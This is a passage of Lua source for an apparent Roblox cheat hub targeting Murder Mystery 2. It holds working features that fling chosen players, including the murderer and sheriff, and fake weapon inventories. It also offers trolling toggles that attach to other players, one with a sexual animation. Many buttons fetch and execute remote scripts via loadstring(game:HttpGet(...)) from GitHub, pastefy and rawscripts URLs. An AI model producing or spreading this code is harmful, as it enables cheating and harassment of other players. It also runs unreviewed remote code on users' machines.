    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
        local lp = game:GetService("Players").LocalPlayer
        local char = lp.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        
        if hrp then
            local oldPos = hrp.CFrame
            SkidFling(target)
            task.wait(1.5) 
            hrp.Velocity = Vector3.new(0, 0, 0)
            hrp.RotVelocity = Vector3.new(0, 0, 0)
            hrp.CFrame = oldPos
        end
    end
end

local Toggle = Tabs.Misc:AddToggle("FlingPlayer", {Title = "Fling Player", Default = false})

Toggle:OnChanged(function(value)
    DConfiguration.Misc.Manipulation.Fling.Enabled = value
    if value then
        task.spawn(function()
            while DConfiguration.Misc.Manipulation.Fling.Enabled do
                local TargetName = DConfiguration.Misc.Manipulation.Fling.Target
                local TargetPlayer = game:GetService("Players"):FindFirstChild(TargetName)
                if TargetPlayer then
                    SafeFling(TargetPlayer)
                end
                task.wait(0.5)
            end
        end)
    end
end)

local FlingDropdown = Tabs.Misc:AddDropdown("FlingDropdown", {
    Title = "Select Player to Fling",
    Values = DFunctions.GetOtherPlayers(),
    Multi = false,
    Default = "",
})

FlingDropdown:OnChanged(function(Value)
    DConfiguration.Misc.Manipulation.Fling.Target = Value
end)

Tabs.Misc:AddButton({
    Title = "Refresh Dropdown",
    Callback = function()
        FlingDropdown:SetValues(DFunctions.GetOtherPlayers())
    end
})

Tabs.Misc:AddButton({
    Title = "Fling Murderer",
    Callback = function()
        task.spawn(function()
            local mdr = Roles.Murderer
            if mdr then
                SafeFling(game:GetService("Players"):FindFirstChild(tostring(mdr)))
            end
        end)
    end
})

Tabs.Misc:AddButton({
    Title = "Fling Sheriff",
    Callback = function()
        task.spawn(function()
            local shf = Roles.Sheriff or Roles.Hero
            if shf then
                SafeFling(game:GetService("Players"):FindFirstChild(tostring(shf)))
            end
        end)
    end
})


-- Visual 

local Player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local WeaponOwnedRange = { min = 1, max = 100000 }

local function spawnWeapon(name)
    local DataBase = require(ReplicatedStorage.Database.Sync.Item)
    local PlayerData = require(ReplicatedStorage.Modules.ProfileData)
    local newOwned = {}
    newOwned[name] = 1
    
    local PlayerWeapons = PlayerData.Weapons
    RunService:BindToRenderStep("InventoryUpdate", 0, function()
        PlayerWeapons.Owned = newOwned
    end)
    
    if Player.Character then
        Player.Character:BreakJoints()
    end
end

local VisualsSection = Tabs.Visuals:AddSection("Weapon Visuals")

Tabs.Visuals:AddSlider("MinSlider", {
    Title = "Min Count",
    Description = "Minimum random items",
    Default = 1,
   Min = 1,
    Max = 100000,
    Rounding = 0,
    Callback = function(Value)
        WeaponOwnedRange.min = Value
    end
})

Tabs.Visuals:AddSlider("MaxSlider", {
    Title = "Max Count",
    Description = "Maximum random items",
    Default = 150,
    Min = 1,
    Max = 100000,
    Rounding = 0,
    Callback = function(Value)
        WeaponOwnedRange.max = Value
    end
})

Tabs.Visuals:AddButton({
    Title = "Spawn Random Godlys",
    Description = "",
    Callback = function()
        local DataBase = require(ReplicatedStorage.Database.Sync.Item)
        local PlayerData = require(ReplicatedStorage.Modules.ProfileData)
        local newOwned = {}
        
        for i, v in pairs(DataBase) do
            newOwned[i] = math.random(WeaponOwnedRange.min, WeaponOwnedRange.max)
        end
        
        RunService:BindToRenderStep("InventoryUpdate", 0, function()
            PlayerData.Weapons.Owned = newOwned
        end)
        
        Fluent:Notify({
            Title = "Visuals Enabled",
            Content = "Fake counts activated!",
            Duration = 2
        })
    end
})

local PASS_ID = 1075128102
local PASS_URL = "https://www.roblox.com/game-pass/" .. PASS_ID

Tabs.Premium:AddButton({
    Title = "🛒 Buy Premium (Copy Link)",
    Description = "Click to copy the link to your clipboard",
    Callback = function()
        if setclipboard then
            setclipboard(PASS_URL)
        end
        
        Fluent:Notify({
            Title = "Premium",
            Content = "Link copied! Paste it into your browser.",
            Duration = 5
        })
        
        game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, PASS_ID)
    end
})

-- Settings

Tabs.Settings:AddParagraph({
        Title = "Configuration",
        Content = " "
    })

Tabs.Settings:AddButton({
        Title = "Remove FPS Counter",
        Description = "",
        Callback = function()
            fpsCounter:Destroy()
        end
    })

-- Save Managers

SaveManager:SetLibrary(Fluent)
InterfaceManager:SetLibrary(Fluent)
FBM:SetLibrary(Fluent)

SaveManager:SetIgnoreIndexes({})

-- Save Folder
InterfaceManager:SetFolder("PhantomWyrmXUniversal")
FBM:SetFolder("PhantomWyrmXUniversal/MM2/FBM")
SaveManager:SetFolder("PhantomWyrmXUniversal/MM2")

InterfaceManager:BuildInterfaceSection(Tabs.Settings)
FBM:BuildConfigSection(Tabs.Settings)
SaveManager:BuildConfigSection(Tabs.Settings)

Window:SelectTab(1)

-- Auto Load Configuration
SaveManager:LoadAutoloadConfig()
FBM:LoadAutoloadConfig()

-- Trolling

Tabs.Troll:AddSection("Players")

local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local lp = Players.LocalPlayer

local SpinSettings = {
    Enabled = false,
    Speed = 50
}

Tabs.Troll:AddToggle("SpinBot", {
    Title = "Spin Bot",
    Default = false,
    Callback = function(Value)
        SpinSettings.Enabled = Value
    end
})

Tabs.Troll:AddSlider("SpinSpeed", {
    Title = "Spin Speed",
    Default = 50,
    Min = 10,
    Max = 300,
    Rounding = 0,
    Callback = function(Value)
        SpinSettings.Speed = Value
    end
})

RunService.Heartbeat:Connect(function()
    if SpinSettings.Enabled and lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
        local hrp = lp.Character.HumanoidRootPart
        hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(SpinSettings.Speed), 0)
    end
end)

Tabs.Troll:AddButton({
    Title = "Wall Walker",
    Description = "Buggy!",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/wallwalker.lua"))()
    end
})

do
    local headSitConnection
    local targetPlayer = nil

    local PlayerDropdown = Tabs.Troll:AddDropdown("SitTarget", {
        Title = "Select Player",
        Description = "",
        Values = {},
        Multi = false,
        Default = nil,
        Callback = function(Value)
            targetPlayer = game.Players:FindFirstChild(Value)
        end
    })

    local function updatePlayerList()
        local players = {}
        for _, v in pairs(game.Players:GetPlayers()) do
            if v ~= lp then table.insert(players, v.Name) end
        end
        PlayerDropdown:SetValues(players)
    end

    updatePlayerList()
    game.Players.PlayerAdded:Connect(updatePlayerList)
    game.Players.PlayerRemoving:Connect(updatePlayerList)

    Tabs.Troll:AddToggle("HeadSit", {
        Title = "Head Sit",
        Description = "",
        Default = false,
        Callback = function(Value)
            if headSitConnection then headSitConnection:Disconnect() end
            if Value then
                headSitConnection = game:GetService("RunService").Stepped:Connect(function()
                    pcall(function()
                        local char = lp.Character
                        local hum = char and char:FindFirstChildOfClass("Humanoid")
                        local root = char and char:FindFirstChild("HumanoidRootPart")
                        
                        if hum and root and targetPlayer and targetPlayer.Character then
                            local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart") or targetPlayer.Character:FindFirstChild("Torso")
                            if targetRoot then
                                hum.Sit = true
                                root.CFrame = targetRoot.CFrame * CFrame.new(0, 1.6, 0.4)
                            end
                        else
                            if headSitConnection then headSitConnection:Disconnect() end
                        end
                    end)
                end)
            end
        end
    })
end


do
    local bangAnim, bangTrack, bangLoop
    local targetPlayer = nil

    local function stopBang()
        if bangTrack then bangTrack:Stop() bangTrack:Destroy() end
        if bangLoop then bangLoop:Disconnect() end
        if bangAnim then bangAnim:Destroy() end
    end

    local PlayerDropdown = Tabs.Troll:AddDropdown("BangTarget", {
        Title = "Select Player",
        Description = "",
        Values = {},
        Multi = false,
        Default = nil,
        Callback = function(Value)
            targetPlayer = game.Players:FindFirstChild(Value)
        end
    })

    local function updatePlayerList()
        local players = {}
        for _, v in pairs(game.Players:GetPlayers()) do
            if v ~= lp then table.insert(players, v.Name) end
        end
        PlayerDropdown:SetValues(players)
    end

    updatePlayerList()
    game.Players.PlayerAdded:Connect(updatePlayerList)
    game.Players.PlayerRemoving:Connect(updatePlayerList)

    Tabs.Troll:AddToggle("BangPlayer", {
        Title = "Bang",
        Description = "",
        Default = false,
        Callback = function(Value)
            stopBang()
            if Value then
                local char = lp.Character
                local hum = char and char:FindFirstChildOfClass("Humanoid")
                local root = char and char:FindFirstChild("HumanoidRootPart")
                if not hum or not root or not targetPlayer or not targetPlayer.Character then return end
                
                bangAnim = Instance.new("Animation")
                bangAnim.AnimationId = (hum.RigType == Enum.HumanoidRigType.R6) and "rbxassetid://148840371" or "rbxassetid://5918726674"
                
                bangTrack = hum:LoadAnimation(bangAnim)
                bangTrack:Play(0.1, 1, 1)
                bangTrack:AdjustSpeed(3)
                
                bangLoop = game:GetService("RunService").Stepped:Connect(function()
                    pcall(function()
                        if targetPlayer and targetPlayer.Character then
                            local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart") or targetPlayer.Character:FindFirstChild("Torso")
                            if targetRoot then 
                                root.CFrame = targetRoot.CFrame * CFrame.new(0, 0, 1.1) 
                            end
                        end
                    end)
                end)
            end
        end
    })
end


Tabs.Troll:AddToggle("SplitToggle", {
    Title = "Split Character",
    Description = "Splits your R15 character in half",
    Default = false,
    Callback = function(Value)
        if Value then
            local char = lp.Character
            local upperTorso = char and char:FindFirstChild("UpperTorso")
            local waist = upperTorso and upperTorso:FindFirstChild("Waist")
            
            if waist then
                waist:Destroy()
            end
        end
    end
})

Tabs.Troll:AddButton(
    {
        Title = "Jerk",
        Description = "",
        Callback = function()
            loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()

        end
    }
)

-- Utilities

Tabs.Utilities:AddSection("Tools")

Tabs.Utilities:AddButton({
    Title = "Get TP Tool",
    Description = "",
    Callback = function()
        local mouse = lp:GetMouse()
        local tool = Instance.new("Tool")
        tool.Name = "Teleport Tool"
        tool.RequiresHandle = false
        tool.Parent = lp:FindFirstChildOfClass("Backpack")
        
        tool.Activated:Connect(function()
            local char = lp.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            if root and mouse.Hit then
                root.CFrame = CFrame.new(mouse.Hit.X, mouse.Hit.Y + 3, mouse.Hit.Z)
            end
        end)
    end
})

Tabs.Utilities:AddButton({
    Title = "Get Delete Tool",
    Description = "",
    Callback = function()
        local mouse = lp:GetMouse()
        local tool = Instance.new("Tool")
        tool.Name = "Delete Tool"
        tool.RequiresHandle = false
        tool.Parent = lp:FindFirstChildOfClass("Backpack")
        
        tool.Activated:Connect(function()
            if mouse.Target then
                mouse.Target:Destroy()
            end
        end)
    end
})

Tabs.Utilities:AddButton({
    Title = "Load F3X Tools",
    Description = "",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/refs/heads/main/f3x.lua"))()
        end
    }
)


-- Info

Tabs.Info:AddButton({
    Title = "Discord Server",
    Description = "Click to copy link",
    Callback = function()
        setclipboard("https://discord.gg/B5rMG9CaA")
    end
})

Tabs.Info:AddParagraph({
    Title = "PhantomWyrm-Hub-X",
    Content = "Made By Carryxkn2"
})

Tabs.Info:AddParagraph({
    Title = "Fluent Modify",
    Content = "Made By Carryxkn2"
})

Tabs.Info:AddParagraph({
    Title = "Fluent UI",
    Content = "By dawid-scripts"
})
    
-- Extention

Tabs.Extension:AddSection("Animation")

Tabs.Extension:AddButton(
    {
        Title = "Free Emote-Animation Pack",
        Description = "By 7yd7",
        Callback = function()
            loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-7yd7-I-Emote-Script-48024"))()
        end
    }
)

Tabs.Extension:AddSection("SkinChanger")

Tabs.Extension:AddButton({
    Title = "Korblox",
    Description = "",
    Callback = function()
        local Players = game:GetService("Players")
        local player = Players.LocalPlayer
        
        local KORBLOX_MESH_ID = "rbxassetid://101851696"
        local KORBLOX_TEXTURE_ID = "rbxassetid://101851703"
        local KORBLOX_COLOR = Color3.fromRGB(50, 50, 50)

        local function applyKorblox(character)
            local humanoid = character:WaitForChild("Humanoid", 10)
            if not humanoid then return end

            local existingFake = character:FindFirstChild("FakeKorbloxLeg")
            if existingFake then existingFake:Destroy() end

            if humanoid.RigType == Enum.HumanoidRigType.R15 then
                local upperLeg = character:WaitForChild("RightUpperLeg", 5)
                local lowerLeg = character:WaitForChild("RightLowerLeg", 5)
                local foot = character:WaitForChild("RightFoot", 5)

                if upperLeg and lowerLeg and foot then
                    for _, p in ipairs({upperLeg, lowerLeg, foot}) do
                        p.Transparency = 1
                        for _, child in ipairs(p:GetChildren()) do
                            if child:IsA("WrapLayer") or child:IsA("SelectionBox") or child:IsA("Attachment") and child.Name:find("Leg") then
                                if not child:IsA("Attachment") then child:Destroy() end
                            end
                        end
                    end

                    local fakeLeg = Instance.new("Part")
                    fakeLeg.Name = "FakeKorbloxLeg"
                    fakeLeg.CanCollide = false
                    fakeLeg.Massless = true
                    fakeLeg.Size = Vector3.new(1, 1, 1)
                    fakeLeg.Color = KORBLOX_COLOR
                    fakeLeg.Parent = character

                    local mesh = Instance.new("SpecialMesh")
                    mesh.MeshType = Enum.MeshType.FileMesh
                    mesh.MeshId = KORBLOX_MESH_ID
                    mesh.TextureId = KORBLOX_TEXTURE_ID
                    mesh.Scale = Vector3.new(1.1, 1.1, 1.1)
                    mesh.Parent = fakeLeg

                    fakeLeg.CFrame = upperLeg.CFrame * CFrame.new(0, -0.7, 0)
                    local weld = Instance.new("WeldConstraint")
                    weld.Part0 = fakeLeg
                    weld.Part1 = upperLeg
                    weld.Parent = fakeLeg
                end

            elseif humanoid.RigType == Enum.HumanoidRigType.R6 then
                local rightLeg = character:WaitForChild("Right Leg", 5)
                if rightLeg then
                    for _, child in ipairs(rightLeg:GetChildren()) do
                        if child:IsA("SpecialMesh") or child:IsA("CharacterMesh") then
                            child:Destroy()
                        end
                    end
                    rightLeg.Color = KORBLOX_COLOR
                    local mesh = Instance.new("SpecialMesh")
                    mesh.MeshType = Enum.MeshType.FileMesh
                    mesh.MeshId = KORBLOX_MESH_ID
                    mesh.TextureId = KORBLOX_TEXTURE_ID
                    mesh.Parent = rightLeg
                end
            end
        end

        if player.Character then
            applyKorblox(player.Character)
        end
        player.CharacterAdded:Connect(applyKorblox)
    end
})

Tabs.Extension:AddButton(
    {
        Title = "Headless",
        Description = "",
        Callback = function()
            local Players = game:GetService("Players")
            local player = Players.LocalPlayer
            local RunService = game:GetService("RunService")
            local HEADLESS_MESH_ID = "rbxassetid://1095708"    -- Tiny invisible headless mesh

            local function applyHeadless(head)
                if not head then
                    return
                end

                head.Transparency = 1
                head.CanCollide = false
                
                local function removeFace()
                    local face = head:FindFirstChild("face")
                    if face then
                        face:Destroy()
                    end
                end

                removeFace()

                local mesh = Instance.new("SpecialMesh")
                mesh.MeshType = Enum.MeshType.FileMesh
                mesh.MeshId = HEADLESS_MESH_ID
                mesh.Scale = Vector3.new(0.001, 0.001, 0.001)
                mesh.Parent = head

                head:GetPropertyChangedSignal("Transparency"):Connect(
                    function()
                        if head.Transparency ~= 1 then
                            head.Transparency = 1
                        end
                    end
                )

                head.ChildAdded:Connect(
                    function(child)
                        if child.Name == "face" and child:IsA("Decal") then
                            child:Destroy()
                        end
                    end
                )
            end

            local function applyCharacter(character)
                local head = character:WaitForChild("Head", 9e9)
                if head then
                    applyHeadless(head)
                end
            end

            local function applyToLocalPlayer()
                if player.Character then
                    applyCharacter(player.Character)
                end
            end

            
            player.CharacterAdded:Connect(
                function(character)
                    applyCharacter(character)
                end
            )

            applyToLocalPlayer()
        end
    }
)

Tabs.Extension:AddButton({
    Title = "AngelicWings",
    Description = "",
    Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/twinkilya0-jpg/Fluent-Modded/refs/heads/master/SkinExtensions/AngelicWings.lua"))()       
    end
})


Tabs.Extension:AddButton({
    Title = "PoisonousHorns",
    Description = "",
    Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/twinkilya0-jpg/Fluent-Modded/refs/heads/master/SkinExtensions/ToxicHorn.lua"))()
    end
})

Tabs.Extension:AddButton({
    Title = "FrozenHorn",
    Description = "",
    Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/twinkilya0-jpg/Fluent-Modded/refs/heads/master/SkinExtensions/FrozenHorn.lua"))()
    end
})

Tabs.Extension:AddButton({
    Title = "FireHorn",
    Description = "",
    Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/twinkilya0-jpg/Fluent-Modded/refs/heads/master/SkinExtensions/FireHorn.lua"))()
    end
})

Tabs.Extension:AddButton({
    Title = "AvatarChanger",
    Description = "By Byteed",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-client-avatar-changer-92130"))()
    end
})


Tabs.Extension:AddSection("Camera Extension")

Tabs.Extension:AddButton(
    {
        Title = "sensitivity",
        Description = "",
        Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/twinkilya0-jpg/Fluent-Modded/refs/heads/master/Others/Sensitivity.lua"))()
        end
    }
)

Tabs.Extension:AddInput("FOV_Val", {
    Title = "FOV", 
    Default = "70", 
    Callback = function(v) 
        local num = tonumber(v)
        if num then
            workspace.CurrentCamera.FieldOfView = num
            fov_val = num 
        end
    end
})

getgenv().Resolution = {
    [".gg/scripters"] = 1
}

local Camera = workspace.CurrentCamera
if getgenv().gg_scripters == nil then
    game:GetService("RunService").RenderStepped:Connect(
        function()
            local res = getgenv().Resolution[".gg/scripters"]
            if res and res ~= 1 then
                Camera.CFrame = Camera.CFrame * CFrame.new(0, 0, 0, 1, 0, 0, 0, res, 0, 0, 0, 1)
            end
        end
    )
end
getgenv().gg_scripters = "Aori0001"

Tabs.Extension:AddInput("Res_Val", {
    Title = "Stretch Res",
    Default = "1",
    Callback = function(v)
        local num = tonumber(v)
        if num then
            getgenv().Resolution[".gg/scripters"] = num
        end
    end
})

Tabs.Extension:AddInput("MaxZoomInput", {
    Title = "Max Zoom Distance",
    Description = "Zoom Unlock",
    Default = "128",
    Numeric = true,
    Finished = true,
    Callback = function(Value)
        local num = tonumber(Value)
        if num then
            game.Players.LocalPlayer.CameraMaxZoomDistance = num
        else
            game.Players.LocalPlayer.CameraMaxZoomDistance = 128
        end
    end
})

Tabs.Extension:AddToggle("NoclipCam", {
    Title = "Noclip Camera",
    Description = "",
    Default = false,
    Callback = function(state)
        local player = game.Players.LocalPlayer
        if state then
            player.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Invisicam
        else
            player.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Zoom
        end
    end
})



local Lighting = game:GetService("Lighting")
local RunService = game:GetService("RunService")

Tabs.Extension:AddSection("Shader Extension")

local function ClearLighting()
    for _, child in ipairs(Lighting:GetChildren()) do
        if child.Name ~= "MenuBlur" then
            child:Destroy()
        end
    end
end

Tabs.Extension:AddButton(
    {
        Title = "Day",
        Description = "",
        Callback = function()
            ClearLighting()

            Lighting.Ambient = Color3.new(0, 0, 0)
            Lighting.OutdoorAmbient = Color3.new(0.568627, 0.501961, 0.372549)
            Lighting.Brightness = 3.130000114440918
            Lighting.ClockTime = 14.5
            Lighting.ExposureCompensation = 0
            Lighting.FogColor = Color3.new(0.572549, 0.815686, 1)
            Lighting.FogEnd = 3000
            Lighting.FogStart = 300
            Lighting.GlobalShadows = true
            Lighting.GeographicLatitude = 143
            Lighting.EnvironmentDiffuseScale = 0.5830000042915344
            Lighting.EnvironmentSpecularScale = 1
            Lighting.ShadowSoftness = 0.03999999910593033
            Lighting.ColorShift_Top = Color3.new(0.737255, 0.552941, 0.00392157)
            Lighting.ColorShift_Bottom = Color3.new(0, 0, 0)
            Lighting.Technology = Enum.Technology.ShadowMap
            Lighting.TimeOfDay = "14:30:00"

            local Sky = Instance.new("Sky")
            Sky.Name = "Sky"
            Sky.SkyboxBk = "rbxassetid://6444884337"
            Sky.SkyboxDn = "rbxassetid://6444884785"
            Sky.SkyboxFt = "rbxassetid://6444884337"
            Sky.SkyboxLf = "rbxassetid://6444884337"
            Sky.SkyboxRt = "rbxassetid://6444884337"
            Sky.SkyboxUp = "rbxassetid://6412503613"
            Sky.MoonAngularSize = 11
            Sky.SunAngularSize = 11
            Sky.MoonTextureId = "rbxassetid://6444320592"
            Sky.SunTextureId = "rbxassetid://1084351190"
            Sky.StarCount = 0
            Sky.Parent = Lighting

            local Bloom = Instance.new("BloomEffect")
            Bloom.Name = "Bloom"
            Bloom.Enabled = true
            Bloom.Intensity = 1
            Bloom.Threshold = 2
            Bloom.Size = 90
            Bloom.Parent = Lighting

            local ColorCorrection = Instance.new("ColorCorrectionEffect")
            ColorCorrection.Name = "ColorCorrection"
            ColorCorrection.Enabled = true
            ColorCorrection.Brightness = 0.03999999910593033
            ColorCorrection.Contrast = 0.1899999976158142
            ColorCorrection.Saturation = 0.11999999731779099
            ColorCorrection.TintColor = Color3.new(1, 1, 1)
            ColorCorrection.Parent = Lighting
        end
    }
)

Tabs.Extension:AddButton(
    {
        Title = "Sunset",
        Description = "",
        Callback = function()
            ClearLighting()

            Lighting.Ambient = Color3.new(0.67451, 0.67451, 0.67451)
            Lighting.OutdoorAmbient = Color3.new(0, 0, 0)
            Lighting.Brightness = 3.799999952316284
            Lighting.ClockTime = 7.099999904632568
            Lighting.ExposureCompensation = -0.23999999463558197
            Lighting.FogColor = Color3.new(0, 0, 0)
            Lighting.FogEnd = 100000000
            Lighting.FogStart = 20
            Lighting.GlobalShadows = true
            Lighting.GeographicLatitude = 72
            Lighting.EnvironmentDiffuseScale = 0.30000001192092896
            Lighting.EnvironmentSpecularScale = 0.05999999865889549
            Lighting.ShadowSoftness = 0.10000000149011612
            Lighting.ColorShift_Top = Color3.new(1, 0.682353, 0.168627)
            Lighting.ColorShift_Bottom = Color3.new(0, 0, 0)
            Lighting.Technology = Enum.Technology.Future
            Lighting.TimeOfDay = "07:06:00"

            local Sky = Instance.new("Sky")
            Sky.Name = "Sky"
            Sky.CelestialBodiesShown = true
            Sky.SkyboxBk = "rbxassetid://1009082031"
            Sky.SkyboxDn = "rbxassetid://1009082487"
            Sky.SkyboxFt = "rbxassetid://1009082252"
            Sky.SkyboxLf = "rbxassetid://1009082137"
            Sky.SkyboxRt = "rbxassetid://1009081946"
            Sky.SkyboxUp = "rbxassetid://1009082428"
            Sky.MoonAngularSize = 0
            Sky.SunAngularSize = 9
            Sky.MoonTextureId = "rbxasset://sky/moon.jpg"
            Sky.SunTextureId = "rbxasset://sky/sun.jpg"
            Sky.StarCount = 3000
            Sky.Parent = Lighting

            local Bloom = Instance.new("BloomEffect")
            Bloom.Name = "Bloom"
            Bloom.Enabled = true
            Bloom.Intensity = 1
            Bloom.Threshold = 1.8240000009536743
            Bloom.Size = 56
            Bloom.Parent = Lighting

            local SunRays = Instance.new("SunRaysEffect")
            SunRays.Name = "SunRays"
            SunRays.Enabled = true
            SunRays.Intensity = 0.18000000715255737
            SunRays.Spread = 0.11999999731779099
            SunRays.Parent = Lighting

            local ColorCorrection = Instance.new("ColorCorrectionEffect")
            ColorCorrection.Name = "ColorCorrection"
            ColorCorrection.Enabled = true
            ColorCorrection.Brightness = 0
            ColorCorrection.Contrast = 0.10000000149011612
            ColorCorrection.Saturation = -0.20000000298023224
            ColorCorrection.TintColor = Color3.new(1, 1, 1)
            ColorCorrection.Parent = Lighting

            local Atmosphere = Instance.new("Atmosphere")
            Atmosphere.Name = "Atmosphere"
            Atmosphere.Color = Color3.new(0.780392, 0.666667, 0.419608)
            Atmosphere.Density = 0.41999998688697815
            Atmosphere.Offset = 0
            Atmosphere.Glare = 0
            Atmosphere.Haze = 0
            Atmosphere.Parent = Lighting
        end
    }
)

Tabs.Extension:AddButton(
    {
        Title = "Shore",
        Description = "",
        Callback = function()
            ClearLighting()

            Lighting.Ambient = Color3.new(0.427451, 0.458824, 0.529412)
            Lighting.OutdoorAmbient = Color3.new(0.141176, 0.184314, 0.227451)
            Lighting.Brightness = 1.9210000038146973
            Lighting.ClockTime = -6.399722099304199
            Lighting.ExposureCompensation = -0.20000000298023224
            Lighting.FogColor = Color3.new(0.752941, 0.752941, 0.752941)
            Lighting.FogEnd = 100000
            Lighting.FogStart = 0
            Lighting.GlobalShadows = true
            Lighting.GeographicLatitude = 0
            Lighting.EnvironmentDiffuseScale = 0.1720000058412552
            Lighting.EnvironmentSpecularScale = 0.6380000114440918
            Lighting.ShadowSoftness = 0.25
            Lighting.ColorShift_Top = Color3.new(0.886275, 0.294118, 0)
            Lighting.ColorShift_Bottom = Color3.new(0.972549, 0.647059, 0.623529)
            Lighting.Technology = Enum.Technology.ShadowMap
            Lighting.TimeOfDay = "-06:23:59"

            local Sky = Instance.new("Sky")
            Sky.Name = "Sky"
            Sky.CelestialBodiesShown = true
            Sky.SkyboxBk = "rbxassetid://88585370973398"
            Sky.SkyboxDn = "rbxassetid://128014535205529"
            Sky.SkyboxFt = "rbxassetid://85323615042244"
            Sky.SkyboxLf = "rbxassetid://77415797450913"
            Sky.SkyboxRt = "rbxassetid://127566931602371"
            Sky.SkyboxUp = "rbxassetid://102320981098060"
            Sky.MoonAngularSize = 0
            Sky.SunAngularSize = 4
            Sky.MoonTextureId = "rbxasset://sky/moon.jpg"
            Sky.SunTextureId = "rbxasset://sky/sun.jpg"
            Sky.StarCount = 5000
            Sky.Parent = Lighting

            local SunRays = Instance.new("SunRaysEffect")
            SunRays.Name = "SunRays"
            SunRays.Enabled = true
            SunRays.Intensity = 0.024000000208616257
            SunRays.Spread = 0.46299999952316284
            SunRays.Parent = Lighting

            local Bloom = Instance.new("BloomEffect")
            Bloom.Name = "Bloom"
            Bloom.Enabled = true
            Bloom.Intensity = 1
            Bloom.Threshold = 2.2911999225616455
            Bloom.Size = 50
            Bloom.Parent = Lighting

            local ColorCorrection = Instance.new("ColorCorrectionEffect")
            ColorCorrection.Name = "ColorCorrection"
            ColorCorrection.Enabled = true
            ColorCorrection.Brightness = 0
            ColorCorrection.Contrast = 0.20000000298023224
            ColorCorrection.Saturation = 0
            ColorCorrection.TintColor = Color3.new(1, 1, 1)
            ColorCorrection.Parent = Lighting

            local Atmosphere = Instance.new("Atmosphere")
            Atmosphere.Name = "Atmosphere"
            Atmosphere.Color = Color3.new(1, 0.847059, 0.760784)
            Atmosphere.Density = 0.35899999737739563
            Atmosphere.Offset = 0
            Atmosphere.Glare = 2.9700000286102295
            Atmosphere.Haze = 1.5199999809265137
            Atmosphere.Parent = Lighting

            local Blur = Instance.new("BlurEffect")
            Blur.Name = "Blur"
            Blur.Size = 4
            Blur.Parent = Lighting
        end
    }
)

Tabs.Extension:AddButton(
    {
        Title = "Cloudy",
        Description = "",
        Callback = function()
            ClearLighting()

            Lighting.Ambient = Color3.new(0, 0, 0)
            Lighting.OutdoorAmbient = Color3.new(0.34902, 0.266667, 0.184314)
            Lighting.Brightness = 5.630000114440918
            Lighting.ClockTime = 17.628889083862305
            Lighting.ExposureCompensation = 0.6299999952316284
            Lighting.FogColor = Color3.new(0.572549, 0.815686, 1)
            Lighting.FogEnd = 3000
            Lighting.FogStart = 300
            Lighting.GlobalShadows = true
            Lighting.GeographicLatitude = 21.58930015563965
            Lighting.EnvironmentDiffuseScale = 0.5830000042915344
            Lighting.EnvironmentSpecularScale = 1
            Lighting.ShadowSoftness = 0.03999999910593033
            Lighting.ColorShift_Top = Color3.new(0.811765, 0.447059, 0)
            Lighting.ColorShift_Bottom = Color3.new(0, 0, 0)
            Lighting.Technology = Enum.Technology.ShadowMap
            Lighting.TimeOfDay = "17:37:44"

            local Sky = Instance.new("Sky")
            Sky.Name = "Sky"
            Sky.CelestialBodiesShown = true
            Sky.SkyboxBk = "rbxassetid://2177969403"
            Sky.SkyboxDn = "rbxassetid://2177972406"
            Sky.SkyboxFt = "rbxassetid://2177970251"
            Sky.SkyboxLf = "rbxassetid://2177969836"
            Sky.SkyboxRt = "rbxassetid://2177968823"
            Sky.SkyboxUp = "rbxassetid://2177971305"
            Sky.MoonAngularSize = 1.5
            Sky.SunAngularSize = 3
            Sky.MoonTextureId = "rbxassetid://1075087760"
            Sky.SunTextureId = "rbxasset://sky/sun.jpg"
            Sky.StarCount = 500
            Sky.Parent = Lighting

            local Bloom = Instance.new("BloomEffect")
            Bloom.Name = "Bloom"
            Bloom.Enabled = true
            Bloom.Intensity = 1
            Bloom.Threshold = 2
            Bloom.Size = 90
            Bloom.Parent = Lighting

            local ColorCorrection = Instance.new("ColorCorrectionEffect")
            ColorCorrection.Name = "ColorCorrection"
            ColorCorrection.Enabled = true
            ColorCorrection.Brightness = 0.03999999910593033
            ColorCorrection.Contrast = 0.15000000596046448
            ColorCorrection.Saturation = 0.20000000298023224
            ColorCorrection.TintColor = Color3.new(1, 1, 1)
            ColorCorrection.Parent = Lighting

            local SunRays = Instance.new("SunRaysEffect")
            SunRays.Name = "SunRays"
            SunRays.Enabled = true
            SunRays.Intensity = 0.004000000189989805
            SunRays.Spread = 0.16699999570846558
            SunRays.Parent = Lighting

            local Atmosphere = Instance.new("Atmosphere")
            Atmosphere.Name = "Atmosphere"
            Atmosphere.Color = Color3.new(0.647059, 0.647059, 0.647059)
            Atmosphere.Density = 0.3569999933242798
            Atmosphere.Offset = 0
            Atmosphere.Glare = 0.20999999344348907
            Atmosphere.Haze = 1.4600000381469727
            Atmosphere.Parent = Lighting
        end
    }
)

Tabs.Extension:AddButton(
    {
        Title = "Night",
        Description = "",
        Callback = function()
            ClearLighting()

            Lighting.Ambient = Color3.new(0, 0, 0)
            Lighting.OutdoorAmbient = Color3.new(0, 0, 0)
            Lighting.Brightness = 2
            Lighting.ClockTime = 3
            Lighting.ExposureCompensation = 0
            Lighting.FogColor = Color3.new(0, 0, 0)
